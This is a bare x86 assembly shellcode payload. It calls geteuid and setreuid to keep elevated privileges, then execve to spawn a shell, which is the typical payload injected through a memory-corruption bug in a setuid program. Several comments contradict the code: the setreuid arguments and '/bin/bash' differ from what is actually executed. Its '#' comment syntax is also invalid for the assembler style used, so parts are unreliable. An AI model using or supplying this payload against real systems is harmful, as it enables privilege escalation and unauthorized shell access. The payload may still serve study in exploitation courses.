section .text
    global _start

_start:
# geteuid()
xor eax, eax
mov al, 49
int 0x80

# setreuid(1006, 0)
mov ebx, eax
mov ecx, eax
xor eax,eax
mov al, 70
int 0x80

# execve(/bin/bash, 0, 0)
mov esi, "//sh"
shr esi, 0x8 
push esi 
push "/bin"
mov ebx, esp    
xor ecx, ecx 
xor edx, edx 
xor eax,eax
mov al, 11
int 0x80
